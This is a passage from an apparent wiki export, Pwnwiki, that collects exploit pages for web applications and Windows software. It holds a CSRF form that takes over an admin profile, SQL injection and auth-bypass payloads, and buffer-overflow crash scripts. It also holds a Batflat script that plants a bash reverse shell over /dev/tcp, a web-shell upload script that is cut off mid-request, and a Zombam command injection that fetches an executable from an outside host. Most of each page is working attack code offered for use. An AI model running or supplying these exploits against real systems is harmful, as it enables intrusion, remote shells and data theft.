http%3A%2F%2Fb2evolution.net%2F&amp;new_field_type=0&amp;actionArray%5Bupdate%5D=Save+Changes%21&amp;crumb_user=zNkyQhORGCWRoCFgM0JhdvYkrqnYpCOl&amp;ctrl=user&amp;user_tab=profile&amp;identity_form=1&amp;user_ID=1&amp;orig_user_ID=1




#### Proof-Of-Concept ####

&lt;html&gt;
  &lt;body&gt;
  &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;
    &lt;form action="https://s2.demo.opensourcecms.com/b2evolution/evoadm.php" method="POST"&gt;
      &lt;input type="hidden" name="edited&amp;#95;user&amp;#95;login" value="CHANGEHERE" /&gt;
      &lt;input type="hidden" name="edited&amp;#95;user&amp;#95;firstname" value="CHANGEHERE" /&gt;
      &lt;input type="hidden" name="edited&amp;#95;user&amp;#95;lastname" value="CHANGEHERE" /&gt;
      &lt;input type="hidden" name="edited&amp;#95;user&amp;#95;nickname" value="CHANGEHERE" /&gt;
      &lt;input type="hidden" name="edited&amp;#95;user&amp;#95;gender" value="M" /&gt;
      &lt;input type="hidden" name="edited&amp;#95;user&amp;#95;ctry&amp;#95;ID" value="233" /&gt;
      &lt;input type="hidden" name="edited&amp;#95;user&amp;#95;rgn&amp;#95;ID" value="" /&gt;
      &lt;input type="hidden" name="edited&amp;#95;user&amp;#95;subrg&amp;#95;ID" value="" /&gt;
      &lt;input type="hidden" name="edited&amp;#95;user&amp;#95;city&amp;#95;ID" value="" /&gt;
      &lt;input type="hidden" name="edited&amp;#95;user&amp;#95;age&amp;#95;min" value="" /&gt;
      &lt;input type="hidden" name="edited&amp;#95;user&amp;#95;age&amp;#95;max" value="" /&gt;
      &lt;input type="hidden" name="edited&amp;#95;user&amp;#95;birthday&amp;#95;month" value="" /&gt;
      &lt;input type="hidden" name="edited&amp;#95;user&amp;#95;birthday&amp;#95;day" value="" /&gt;
      &lt;input type="hidden" name="edited&amp;#95;user&amp;#95;birthday&amp;#95;year" value="" /&gt;
      &lt;input type="hidden" name="organizations&amp;#91;&amp;#93;" value="1" /&gt;
      &lt;input type="hidden" name="org&amp;#95;roles&amp;#91;&amp;#93;" value="King&amp;#32;of&amp;#32;Spades" /&gt;
      &lt;input type="hidden" name="org&amp;#95;priorities&amp;#91;&amp;#93;" value="" /&gt;
      &lt;input type="hidden" name="uf&amp;#95;1" value="I&amp;#32;am&amp;#32;the&amp;#32;demo&amp;#32;administrator&amp;#32;of&amp;#32;this&amp;#32;site&amp;#46;&amp;#13;&amp;#10;I&amp;#32;love&amp;#32;having&amp;#32;so&amp;#32;much&amp;#32;power&amp;#33;" /&gt;
      &lt;input type="hidden" name="uf&amp;#95;new&amp;#91;2&amp;#93;&amp;#91;&amp;#93;" value="" /&gt;
      &lt;input type="hidden" name="uf&amp;#95;new&amp;#91;3&amp;#93;&amp;#91;&amp;#93;" value="" /&gt;
      &lt;input type="hidden" name="uf&amp;#95;2" value="https&amp;#58;&amp;#47;&amp;#47;twitter&amp;#46;com&amp;#47;b2evolution&amp;#47;" /&gt;
      &lt;input type="hidden" name="uf&amp;#95;3" value="https&amp;#58;&amp;#47;&amp;#47;www&amp;#46;facebook&amp;#46;com&amp;#47;b2evolution" /&gt;
      &lt;input type="hidden" name="uf&amp;#95;4" value="https&amp;#58;&amp;#47;&amp;#47;plus&amp;#46;google&amp;#46;com&amp;#47;&amp;#43;b2evolution&amp;#47;posts" /&gt;
      &lt;input type="hidden" name="uf&amp;#95;5" value="https&amp;#58;&amp;#47;&amp;#47;www&amp;#46;linkedin&amp;#46;com&amp;#47;company&amp;#47;b2evolution&amp;#45;net" /&gt;
      &lt;input type="hidden" name="uf&amp;#95;6" value="https&amp;#58;&amp;#47;&amp;#47;github&amp;#46;com&amp;#47;b2evolution&amp;#47;b2evolution" /&gt;
      &lt;input type="hidden" name="uf&amp;#95;7" value="http&amp;#58;&amp;#47;&amp;#47;b2evolution&amp;#46;net&amp;#47;" /&gt;
      &lt;input type="hidden" name="new&amp;#95;field&amp;#95;type" value="0" /&gt;
      &lt;input type="hidden" name="actionArray&amp;#91;update&amp;#93;" value="Save&amp;#32;Changes&amp;#33;" /&gt;
      &lt;input type="hidden" name="crumb&amp;#95;user" value="zNkyQhORGCWRoCFgM0JhdvYkrqnYpCOl" /&gt;
      &lt;input type="hidden" name="ctrl" value="user" /&gt;
      &lt;input type="hidden" name="user&amp;#95;tab" value="profile" /&gt;
      &lt;input type="hidden" name="identity&amp;#95;form" value="1" /&gt;
      &lt;input type="hidden" name="user&amp;#95;ID" value="1" /&gt;
      &lt;input type="hidden" name="orig&amp;#95;user&amp;#95;ID" value="1" /&gt;
      &lt;input type="submit" value="Submit request" /&gt;
    &lt;/form&gt;
  &lt;/body&gt;
&lt;/html&gt;
&lt;/pre&gt;</text>
      <sha1>8g11vjxodg539u20cb3fibxqx9mfh3x</sha1>
    </revision>
  </page>
  <page>
    <title>BOOTP Turbo 2.0.0.1253 - 'bootpt.exe' Unquoted Service Path</title>
    <ns>0</ns>
    <id>2321</id>
    <revision>
      <id>2757</id>
      <timestamp>2021-05-11T03:42:07Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: BOOTP Turbo 2.0.0.1253 - 'bootpt.exe' Unquoted Service Path # Discovery by: Erick Galindo  # Discovery Date: 2020-05-07 # Vendor Homepage: https..."</comment>
      <origin>2757</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1408" sha1="f5zbtkgcc38699lnx0uno306uzvyt72" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: BOOTP Turbo 2.0.0.1253 - 'bootpt.exe' Unquoted Service Path
# Discovery by: Erick Galindo 
# Discovery Date: 2020-05-07
# Vendor Homepage: https://www.weird-solutions.com
# Software :  https://www.weird-solutions.com/download/products/bootpt_demo_x64.exe
# Tested Version: 2.0.0.1253
# Vulnerability Type: Unquoted Service Path
# Tested on OS: Windows 10 Pro  x64 es
# Step to discover Unquoted Service Path:

C:\&gt; wmic service get name, displayname, pathname, startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr  /i "BOOTP"
BOOTP Turbo           BOOTP Turbo           C:\Program Files\BOOTP Turbo\bootpt.exe                    Auto

# Service info

C:\&gt;sc qc "BOOTP Turbo"
[SC] QueryServiceConfig CORRECTO

NOMBRE_SERVICIO: BOOTP Turbo
        TIPO               : 10  WIN32_OWN_PROCESS
        TIPO_INICIO        : 2   AUTO_START
        CONTROL_ERROR      : 1   NORMAL
        NOMBRE_RUTA_BINARIO: C:\Program Files\BOOTP Turbo\bootpt.exe
        GRUPO_ORDEN_CARGA  :
        ETIQUETA           : 0
        NOMBRE_MOSTRAR     : BOOTP Turbo
        DEPENDENCIAS       : Nsi
                           : Afd
                           : NetBT
                           : Tcpip
        NOMBRE_INICIO_SERVICIO: LocalSystem
		
#Exploit:

This vulnerability could permit executing code during startup or reboot with the escalated privileges.
            
&lt;/pre&gt;</text>
      <sha1>f5zbtkgcc38699lnx0uno306uzvyt72</sha1>
    </revision>
  </page>
  <page>
    <title>BSPHP 未授權訪問漏洞</title>
    <ns>0</ns>
    <id>1067</id>
    <revision>
      <id>1346</id>
      <timestamp>2021-04-10T01:54:44Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==Payload== &lt;pre&gt; http://127.0.0.1/admin/index.php?m=admin&amp;c=log&amp;a=table_json&amp;json=get&amp;soso_ok=1&amp;t=user_login_log&amp;page=1&amp;limit=10&amp; &lt;/pre&gt;"</comment>
      <origin>1346</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="137" sha1="h805fu7v2nzsnvaqxqsgg2ytmv9eewn" xml:space="preserve">==Payload==
&lt;pre&gt;
http://127.0.0.1/admin/index.php?m=admin&amp;c=log&amp;a=table_json&amp;json=get&amp;soso_ok=1&amp;t=user_login_log&amp;page=1&amp;limit=10&amp;
&lt;/pre&gt;</text>
      <sha1>h805fu7v2nzsnvaqxqsgg2ytmv9eewn</sha1>
    </revision>
  </page>
  <page>
    <title>Baby Care System 1.0 SQL注入漏洞</title>
    <ns>0</ns>
    <id>1032</id>
    <revision>
      <id>1307</id>
      <timestamp>2021-04-09T08:53:27Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== &lt;pre&gt; # Exploit Title: Baby Care System 1.0 - 'roleid' SQL Injection # Exploit Author: Vijay Sachdeva # Date: 2020-12-23 # Vendor Homepage: https://www.sourcecodester..."</comment>
      <origin>1307</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2311" sha1="cs4ak83wd3rr4gkufcpnngiugwbu5rc" xml:space="preserve">==INFO==
&lt;pre&gt;
# Exploit Title: Baby Care System 1.0 - 'roleid' SQL Injection
# Exploit Author: Vijay Sachdeva
# Date: 2020-12-23
# Vendor Homepage: https://www.sourcecodester.com/php/14622/baby-care-system-phpmysqli-full-source-code.html
# Software Link: https://www.sourcecodester.com/download-code?nid=14622&amp;title=Baby+Care+System+in+PHP%2FMySQLi+with+Full+Source+Code+
# Affected Version: Version 1
# Tested on Kali Linux

Step 1. Log in to the application with admin credentials.

Step 2. Click on "MENUS" on the left side and then edit any "Page Role".

Step 3. On the edit page, the URL should be: http://localhost/BabyCare-master/admin.php?id=pagerole&amp;action=edit&amp;roleid=7

Step 4. Run sqlmap on the URL where the "roleid" parameter is given

sqlmap -u "
http://192.168.1.240/BabyCare-master/admin.php?id=pagerole&amp;action=edit&amp;roleid=7"
--banner

---

Parameter: roleid (GET)

    Type: boolean-based blind

    Title: AND boolean-based blind - WHERE or HAVING clause

    Payload: id=pagerole&amp;action=edit&amp;roleid=8' AND 3077=3077 AND
'IPDn'='IPDn


    Type: error-based

    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP
BY clause (FLOOR)

    Payload: id=pagerole&amp;action=edit&amp;roleid=8' AND (SELECT 2834 FROM(SELECT
COUNT(*),CONCAT(0x7170767871,(SELECT
(ELT(2834=2834,1))),0x71717a6271,FLOOR(RAND(0)*2))x FROM
INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'jnFT'='jnFT


    Type: time-based blind

    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)

    Payload: id=pagerole&amp;action=edit&amp;roleid=8' AND (SELECT 4559 FROM
(SELECT(SLEEP(5)))jaEa) AND 'iBGT'='iBGT


    Type: UNION query

    Title: Generic UNION query (NULL) - 4 columns

    Payload: id=pagerole&amp;action=edit&amp;roleid=-2488' UNION ALL SELECT
CONCAT(0x7170767871,0x7577594366596d7077424f5746685366434a5244775565756b7a41566d63546c5156564e6d67556e,0x71717a6271),NULL,NULL,NULL--
-

---

[05:32:00] [INFO] the back-end DBMS is MySQL

[05:32:00] [INFO] fetching banner

back-end DBMS: MySQL &gt;= 5.0 (MariaDB fork)

banner: '10.3.24-MariaDB-2'

---

[08:18:34] [INFO] the back-end DBMS is MySQL

[08:18:34] [INFO] fetching banner

back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)

banner: '10.3.24-MariaDB-2'


---

Step 5. Sqlmap should inject the web-app successfully which leads to information disclosure.
&lt;/pre&gt;</text>
      <sha1>cs4ak83wd3rr4gkufcpnngiugwbu5rc</sha1>
    </revision>
  </page>
  <page>
    <title>Backdoor.Win32.Zombam.gen 命令注入漏洞</title>
    <ns>0</ns>
    <id>6123</id>
    <revision>
      <id>6997</id>
      <timestamp>2021-07-11T13:52:55Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;pre&gt; Discovery / credits: Malvuln - malvuln.com (c) 2021 Original source: https://malvuln.com/advisory/ff6516c881dee555b0cd253408b64404_B.txt Contact: malvuln13@gmail.com Med..."</comment>
      <origin>6997</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2435" sha1="fym29ka20tcndjd5q1zf53vcbc2zugt" xml:space="preserve">&lt;pre&gt;
Discovery / credits: Malvuln - malvuln.com (c) 2021
Original source: https://malvuln.com/advisory/ff6516c881dee555b0cd253408b64404_B.txt
Contact: malvuln13@gmail.com
Media: twitter.com/malvuln

Threat: Backdoor.Win32.Zombam.gen
Vulnerability: Unauthenticated URL Command Injection 
Description: Zombam malware listens on TCP port 80 and deploys a HTML Web UI for basic remote administration capability. The RAT has option to kill processes by clicking a link E.g. href="/kill&amp;smss.exe&amp;" this would terminate the smss.exe process. By changing "kill" to exec "exec&amp;&lt;command-to-run&gt;" you can start arbitrary processes. Crafting a successful injection requires padding an extra character to the end of the executable extension you want to call, otherwise it gets truncated and will fail. Example, curl http://x.x.x.x/exec&amp;calc.exe results in the following message: "error! calc.ex cannot be executed". However, padding the extra character so ".exe" becomes ".exee", curl http://x.x.x.x/exec&amp;calc.exee will successfully process and we will get the response "calc.exe executed".
Type: PE32
MD5: ff6516c881dee555b0cd253408b64404 
Vuln ID: MVID-2021-0244
Disclosure: 06/10/2021

Exploit/PoC:
Opens the default web-browser on the infected host to download the file "DOOM.exe" from the server.

CURL http://x.x.x.x/exec&amp;http://hyp3rlinx.altervista.org/DOOM.exee

HTTP Response: 
http://hyp3rlinx.altervista.org/DOOM.exe executed


Disclaimer: The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise. Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information or exploits by the author or elsewhere. Do not attempt to download Malware samples. The author of this website takes no responsibility for any kind of damages occurring from improper Malware handling or the downloading of ANY Malware mentioned on this website or elsewhere. All content Copyright (c) Malvuln.com (TM).

&lt;/pre&gt;</text>
      <sha1>fym29ka20tcndjd5q1zf53vcbc2zugt</sha1>
    </revision>
  </page>
  <page>
    <title>Backup Key Recovery 2.2.7 拒絕服務漏洞</title>
    <ns>0</ns>
    <id>3668</id>
    <revision>
      <id>4257</id>
      <timestamp>2021-06-08T12:23:57Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;pre&gt; # Exploit Title: Backup Key Recovery 2.2.7 - Denial of Service (PoC) # Date: 07/06/2021 # Author: Erick Galindo  # Vendor Homepage: http://www.nsauditor.com # Software h..."</comment>
      <origin>4257</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="621" sha1="2ub33v507xmuh5ruy1y1z07bb911o9y" xml:space="preserve">&lt;pre&gt;
# Exploit Title: Backup Key Recovery 2.2.7 - Denial of Service (PoC)
# Date: 07/06/2021
# Author: Erick Galindo 
# Vendor Homepage: http://www.nsauditor.com
# Software http://www.nsauditor.com/downloads/backeyrecovery_setup.exe
# Version: 2.2.7.0
# Tested on: Windows 10 Pro x64 es

# Proof of Concept:
#1.- Copy printed "AAAAA..." string to clipboard!
#2.- Open BackupKeyRecovery.exe
#3.- Go to Register &gt; Enter Registration Code...
#4.- Write anything in 'Name' field
#5.- Paste clipboard in 'Key' field
#6.- Click on button -&gt; Ok

buffer = "\x41" * 256

f = open ("poc.txt", "w")
f.write(buffer)
f.close()
&lt;/pre&gt;</text>
      <sha1>2ub33v507xmuh5ruy1y1z07bb911o9y</sha1>
    </revision>
  </page>
  <page>
    <title>Backup Manager Module 3.0.0.99 - 'IScheduleSvc.exe' Unquoted Service Path</title>
    <ns>0</ns>
    <id>2516</id>
    <revision>
      <id>3009</id>
      <timestamp>2021-05-21T06:37:20Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: Acer Backup Manager Module 3.0.0.99 - 'IScheduleSvc.exe'  Unquoted Service Path # Discovery by: Emmanuel Lujan # Discovery Date: 2021-05-19 # Ve..."</comment>
      <origin>3009</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1662" sha1="7ekqhnu7ov8pfnstw4b3matswuowyth" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: Acer Backup Manager Module 3.0.0.99 - 'IScheduleSvc.exe'  Unquoted Service Path
# Discovery by: Emmanuel Lujan
# Discovery Date: 2021-05-19
# Vendor Homepage: https://www.acer.com/ac/en/US/content/home
# Tested Version: 3.0.0.99
# Vulnerability Type: Unquoted Service Path
# Tested on OS: Windows 7 Home Premium x64 

# Step to discover Unquoted Service Path: 

C:\&gt;wmic service get name, pathname, displayname, startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """

NTI IScheduleSvc                                                        NTI ISch
eduleSvc                              C:\Program Files (x86)\NTI\Acer Backup Man
ager\IScheduleSvc.exe                                     Auto


# Service info:

C:\&gt;sc qc "NTI IScheduleSvc"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: NTI IScheduleSvc
        TYPE               : 110  WIN32_OWN_PROCESS &lt;interactive&gt;
        START_TYPE         : 2   AUTO_START  
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files (x86)\Acer Backup Manager\IScheduleSvc.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : NTI IScheduleSvc
        DEPENDENCIES       :                            
        SERVICE_START_NAME : LocalSystem

#Exploit:

A successful attempt would require the local user to be able to insert their code in the system root path undetected by the OS or other
 security applications where it could potentially be executed during application startup or reboot. If successful, the local user's 
code would execute with the elevated privileges of the application.
&lt;/pre&gt;</text>
      <sha1>7ekqhnu7ov8pfnstw4b3matswuowyth</sha1>
    </revision>
  </page>
  <page>
    <title>BasicNote 1.1.9 拒絕服務漏洞</title>
    <ns>0</ns>
    <id>3359</id>
    <revision>
      <id>3923</id>
      <timestamp>2021-06-03T11:59:40Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==POC== &lt;pre&gt; # Exploit Title: BasicNote 1.1.9 - Denial of Service (PoC) # Date: 2021-06-02 # Author: Brian Rodríguez # Download Link: https://play.google.com/store/apps/deta..."</comment>
      <origin>3923</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1024" sha1="7mz5ii6xgy0rel594xi2ls2twbnpzgl" xml:space="preserve">==POC==
&lt;pre&gt;
# Exploit Title: BasicNote 1.1.9 - Denial of Service (PoC)
# Date: 2021-06-02
# Author: Brian Rodríguez
# Download Link: https://play.google.com/store/apps/details?id=notizen.basic.notes.notas.note.notepad&amp;hl=es_MX
# Version: 1.1.9
# Category: DoS (Android)

##### Vulnerability #####

BasicNote - Notas, Bloc de notas is vulnerable to a DoS condition when two long lists of characters are being used when creating a note:

# STEPS #
# Open the program
# Create a new Note.
# Run the python exploit script payload.py, it will create a new payload.txt file
# Copy the content of the file "payload.txt"
# Paste the content from payload.txt twice in the new Note.
# Crashed

Successful exploitation will causes application stop working.

I have been able to test this exploit against Android 8.0.

##### PoC #####

#!/usr/bin/env python
buffer = "\x41" * 350000

try:
    f = open("payload.txt","w")
    f.write(buffer)
    f.close()
    print ("File created")
except:
    print ("File cannot be created")
&lt;/pre&gt;</text>
      <sha1>7mz5ii6xgy0rel594xi2ls2twbnpzgl</sha1>
    </revision>
  </page>
  <page>
    <title>Basic Shopping Cart 1.0 身份驗證繞過漏洞</title>
    <ns>0</ns>
    <id>977</id>
    <revision>
      <id>1251</id>
      <timestamp>2021-04-08T09:04:58Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: Basic Shopping Cart 1.0 - Authentication Bypass # Date: 2021-04-03 # Exploit Author:  Viren Saroha (illusion) # Vendor Homepage: https://www.sou..."</comment>
      <origin>1251</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1476" sha1="qu87t601vdhx1rhjhrq5nw5e07vep2e" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: Basic Shopping Cart 1.0 - Authentication Bypass
# Date: 2021-04-03
# Exploit Author:  Viren Saroha (illusion)
# Vendor Homepage: https://www.sourcecodester.com/php/10964/basic-shopping-cartphpmysql.html
# Software Link: https://www.sourcecodester.com/download-code?nid=10964&amp;title=Basic+Shopping+Cart+using+PHP%2FMySQL+with+Source+Code
# Version: 1.0
# Tested on: Windows 10/Kali Linux

POC

Step 1 -  Go to url http://localhost/EdgeSketch/index.php and Click on Admin
Step 2 – Enter anything in username and password
Step 3 – Click on Login and capture the request in burpsuite
Step4 – Change the username to   ' or '1'='1'#
Step 5 – Click forward and now you will be logged in as admin.

REQUEST

POST /EdgeSketch/adminlogin.php HTTP/1.1
Host: localhost
Content-Length: 77
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://localhost/EdgeSketch/index.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=6b7072bb40c321cb336aacef057a0876
Connection: close

admin_username=%27+or+%271%27%3D%271%27%23&amp;admin_password=random&amp;admin_login=
&lt;/pre&gt;</text>
      <sha1>qu87t601vdhx1rhjhrq5nw5e07vep2e</sha1>
    </revision>
  </page>
  <page>
    <title>Batflat CMS 1.3.6 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>983</id>
    <revision>
      <id>1257</id>
      <timestamp>2021-04-08T09:18:33Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: Batflat CMS 1.3.6 - Remote Code Execution (Authenticated) # Date: 2020-12-27 # Exploit Author: mari0x00 # Vendor Homepage: https://batflat.org/..."</comment>
      <origin>1257</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2779" sha1="h9oe749iu42ulk8hybewajnb2iaihf8" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: Batflat CMS 1.3.6 - Remote Code Execution (Authenticated)
# Date: 2020-12-27
# Exploit Author: mari0x00
# Vendor Homepage: https://batflat.org/
# Software Link: https://github.com/sruupl/batflat/archive/master.zip
# Description: https://secator.pl/index.php/2021/02/15/batflat-v-1-3-6-authenticated-remote-code-execution-public-disclosure/
# Version: &lt;= 1.3.6
# CVE: CVE-2020-35734

#!/usr/bin/python3

import requests
import sys
import re
from bs4 import BeautifulSoup
from termcolor import colored
from time import sleep

print(colored('''###########################################################''',"red"))
print(colored('''#######    Batflat authenticated RCE by mari0x00    #######''',"red"))
print(colored('''###########################################################''',"red"))
print("")

if len(sys.argv) != 6:
    print((colored("[~] Usage : python3 batpwnd.py &lt;url&gt; &lt;username&gt; &lt;password&gt; &lt;IP&gt; &lt;PORT&gt;","red")))
    print((colored("[~] Default credentials: admin/admin","red")))
    print((colored("[~] Example: python3 batpwnd.py http://192.168.101.105/ admin admin 192.168.101.101 4444","red")))
    exit()
url = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
IP = sys.argv[4]
PORT = sys.argv[5]


#Start session
s = requests.Session()
headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'}


#Authenticate
print((colored("[+] Attempting user login","blue")))

login_data = {
    "username": username,
    "password": password,
    "login": "",
   }

login = s.post(url+"admin/", login_data, headers=headers)
sleep(0.5)

#Get token
print((colored("[+] Retrieving the token","blue")))
r = s.get(url+"admin/", headers=headers).content
soup = BeautifulSoup(r, "lxml")
token = (re.search(r't=(.*?)"&gt;Add', str(soup)).group(1))
print((colored("[+] Token ID: " + token,"blue")))
sleep(0.5)

#Get URL
print((colored("[+] Getting the add-user endpoint URL","blue")))
r = s.get(url+"admin/users/add?t="+token, headers=headers).content
soup = BeautifulSoup(r, "lxml")
add_user_url = (re.search(r'action="(.*?)"', str(soup)).group(1))
sleep(0.5)

#Exploit
print((colored("[+] Adding pwnd user","blue")))
payload = "&lt;?php system(\"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/" + IP + "/" + PORT + " 0&gt;&amp;1'\");?&gt;"

add_user = {
    "username": (None, "pwnd"),
    "fullname": (None, payload),
    "description": (None, "pwnd"),
    "email": (None, "pwnd@evil.com"),
    "password": (None, "pwnd123"),
    "access[]": (None, "users"),
    "save": (None, "Save")
}

exploit = s.post(add_user_url, headers=headers, files=add_user)
sleep(0.5)

#Triggering reverse shell
print("")
print((colored("[+] Triggering the shell. Go nuts!","green")))
r = s.get(url+"admin/users/manage?t="+token, headers=headers)
&lt;/pre&gt;</text>
      <sha1>h9oe749iu42ulk8hybewajnb2iaihf8</sha1>
    </revision>
  </page>
  <page>
    <title>Billing Management System 2.0 SQL注入身份驗證繞過漏洞</title>
    <ns>0</ns>
    <id>984</id>
    <revision>
      <id>1258</id>
      <timestamp>2021-04-08T09:19:36Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: Billing Management System 2.0 - 'email' SQL injection Auth Bypass # Date: 2021-02-16 # Exploit Author: Pintu Solanki # Vendor Homepage: https://..."</comment>
      <origin>1258</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="881" sha1="gda6qs8acy81tbyshbbynwyn5y2eez4" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: Billing Management System 2.0 - 'email' SQL injection Auth Bypass
# Date: 2021-02-16
# Exploit Author: Pintu Solanki
# Vendor Homepage: https://www.sourcecodester.com/
# Software Link: https://www.sourcecodester.com/php/14380/billing-management-system-php-mysql-updated.html
# Software: Billing Management System 2.0
# Vulnerability Type: SQL injection - Auth Bypass
# Tested On: Windows 10 Pro 10.0.18363 N/A Build 18363 + XAMPP V3.2.4
# This application is vulnerable to SQL injection vulnerability.
# Vulnerable Page: http://localhost/smartbilling/smartbilling_source_code/index.php
# Payload used:

Username =&gt; admin' or '1'='1
Password =&gt; admin' or '1'='1

# POC: Whenever we will go to the page (http://localhost/smartbilling/smartbilling_source_code/index.php) when we inject SQL Payload then we will directly enter into the admin page.
&lt;/pre&gt;</text>
      <sha1>gda6qs8acy81tbyshbbynwyn5y2eez4</sha1>
    </revision>
  </page>
  <page>
    <title>Billing System Project 1.0 遠程命令執行漏洞</title>
    <ns>0</ns>
    <id>5596</id>
    <revision>
      <id>6429</id>
      <timestamp>2021-07-07T02:53:08Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;pre&gt; # Exploit Title: Billing System Project 1.0 - Remote Code Execution (RCE) (Unauthenticated) # Date: 06.07.2021 # Exploit Author: Talha DEMİRSOY # Software Link: https:/..."</comment>
      <origin>6429</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2653" sha1="19ycqwca315kqgmtomjepo7o2rv31zg" xml:space="preserve">&lt;pre&gt;
# Exploit Title: Billing System Project 1.0 - Remote Code Execution (RCE) (Unauthenticated)
# Date: 06.07.2021
# Exploit Author: Talha DEMİRSOY
# Software Link: https://www.sourcecodester.com/php/14831/billing-system-project-php-source-code-free-download.html
# Version: V 1.0
# Tested on: Linux &amp; Windows

import requests
import random
import string
from bs4 import BeautifulSoup

let = string.ascii_lowercase
shellname = ''.join(random.choice(let) for i in range(15))
randstr = ''.join(random.choice(let) for i in range(15))

payload= "&lt;?php if(isset($_GET['cmd'])){ echo '&lt;pre&gt;'; $cmd =
($_GET['cmd']); system($cmd); echo '&lt;/pre&gt;'; die; } ?&gt;"

url = input("Target : ")

session = requests.session()

reqUrl = url + "login.php"
reqHead = {"Content-Type": "application/x-www-form-urlencoded"}
reqData = {"username": "admin' or '1'='1'#", "password": "-", "login": ''}
session.post(reqUrl, headers=reqHead, data=reqData)

print("Shell Uploading...")

reqUrl = url + "php_action/createProduct.php"
reqHead = {"Content-Type": "multipart/form-data;
boundary=----WebKitFormBoundaryOGdnGszwuETwo6WB"}
reqData =
"\r\n\r\n------WebKitFormBoundaryOGdnGszwuETwo6WB\r\nContent-Disposition:
form-data;
name=\"currnt_date\"\r\n\r\n\r\n------WebKitFormBoundaryOGdnGszwuETwo6WB\r\nContent-Disposition:
form-data; name=\"productImage\";
filename=\""+shellname+".php\"\r\nContent-Type:
application/octet-stream\r\n\r\n"+payload+"\r\n\r\n------WebKitFormBoundaryOGdnGszwuETwo6WB\r\nContent-Disposition:
form-data;
name=\"productName\"\r\n\r\n"+randstr+"_TalhaDemirsoy\r\n------WebKitFormBoundaryOGdnGszwuETwo6WB\r\nContent-Disposition:
form-data;
name=\"quantity\"\r\n\r\n1\r\n------WebKitFormBoundaryOGdnGszwuETwo6WB\r\nContent-Disposition:
form-data;
name=\"rate\"\r\n\r\n1\r\n------WebKitFormBoundaryOGdnGszwuETwo6WB\r\nContent-Disposition:
form-data;
name=\"brandName\"\r\n\r\n1\r\n------WebKitFormBoundaryOGdnGszwuETwo6WB\r\nContent-Disposition:
form-data;
name=\"categoryName\"\r\n\r\n2\r\n------WebKitFormBoundaryOGdnGszwuETwo6WB\r\nContent-Disposition:
form-data;
